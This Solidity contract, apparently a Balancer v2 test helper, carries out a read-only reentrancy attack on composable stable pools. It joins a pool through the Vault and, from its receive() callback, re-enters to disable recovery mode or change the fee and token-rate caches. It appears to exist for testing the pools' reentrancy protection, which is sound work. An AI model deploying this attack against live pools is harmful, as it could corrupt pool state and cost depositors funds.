// SPDX-License-Identifier: GPL-3.0-or-later
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-utils/IProtocolFeeCache.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-utils/IRateProvider.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-utils/IRateProviderPool.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-utils/IRecoveryMode.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-stable/IComposableStablePoolRates.sol";

/**
 * @notice Performs a read-only reentrancy attack on a target composable stable pool, making use of the `receive`
 * callback hook in the middle of a join operation.
 */
contract ReadOnlyReentrancyAttackerCSP {
    enum AttackType {
        DISABLE_RECOVERY_MODE,
        UPDATE_PROTOCOL_FEE_CACHE,
        UPDATE_TOKEN_RATE_CACHE,
        SET_TOKEN_RATE_CACHE_DURATION
    }

    IVault private immutable _vault;
    AttackType private _attackType;
    bytes32 private _poolId;
    address private _tokenWithProvider;

    constructor(IVault vault) {
        _vault = vault;
    }

    /**
     * @dev Starts attack on target pool.
     * The contract needs to have the necessary funds as specified in the given `IVault.JoinPoolRequest` (i.e. the
     * correct tokens and quantities) before this function is called.
     *
     * This function must be called with a non-zero ETH value.
     * If `attackType` is `UPDATE_TOKEN_RATE_CACHE` or `SET_TOKEN_RATE_CACHE_DURATION`, at least one of the tokens
     * in the pool should have a working rate provider; otherwise the function will revert.
     *
     * @param poolId Pool ID to attack.
     * @param joinPoolRequest Join request, compatible with pool ID. Token amounts can be anything that triggers
     * a valid join in the pool.
     * @param attackType Type of attack; determines which vulnerable pool function to call.
     */
    function startAttack(
        bytes32 poolId,
        IVault.JoinPoolRequest memory joinPoolRequest,
        AttackType attackType
    ) external payable {
        _attackType = attackType;
        _poolId = poolId;
        _tokenWithProvider = address(0);

        uint256 assetsLength = joinPoolRequest.assets.length;
        IVault vault = _vault;
        for (uint256 i = 0; i < assetsLength; ++i) {
            IERC20 asset = IERC20(address(joinPoolRequest.assets[i]));
            asset.approve(address(vault), joinPoolRequest.maxAmountsIn[i]);
        }

        if (_needsRateProvider(attackType)) {
            (address pool, ) = _vault.getPool(_poolId);

            IRateProvider[] memory rateProviders = IRateProviderPool(pool).getRateProviders();
            for (uint256 i = 0; i < rateProviders.length; ++i) {
                address rateProvider = address(rateProviders[i]);
                if (rateProvider != address(0)) {
                    _tokenWithProvider = address(joinPoolRequest.assets[i]);
                    break;
                }
            }
            require(_tokenWithProvider != address(0), "None of the pool tokens has a rate provider");
        }

        vault.joinPool{ value: msg.value }(poolId, address(this), address(this), joinPoolRequest);
    }

    receive() external payable {
        _reenterAttack();
    }

    function _reenterAttack() internal {
        AttackType attackType = _attackType;
        (address pool, ) = _vault.getPool(_poolId);

        if (attackType == AttackType.DISABLE_RECOVERY_MODE) {
            IRecoveryMode(pool).disableRecoveryMode();
        } else if (attackType == AttackType.UPDATE_PROTOCOL_FEE_CACHE) {
            IProtocolFeeCache(pool).updateProtocolFeePercentageCache();
        } else if (attackType == AttackType.UPDATE_TOKEN_RATE_CACHE) {
            require(_tokenWithProvider != address(0), "Token to update not set");
            IComposableStablePoolRates(pool).updateTokenRateCache(IERC20(_tokenWithProvider));
        } else if (attackType == AttackType.SET_TOKEN_RATE_CACHE_DURATION) {
            require(_tokenWithProvider != address(0), "Token to update not set");
            IComposableStablePoolRates(pool).setTokenRateCacheDuration(IERC20(_tokenWithProvider), 1);
        }
    }

    function _needsRateProvider(AttackType attackType) private pure returns (bool) {
        return
            attackType == AttackType.UPDATE_TOKEN_RATE_CACHE || attackType == AttackType.SET_TOKEN_RATE_CACHE_DURATION;
    }
}
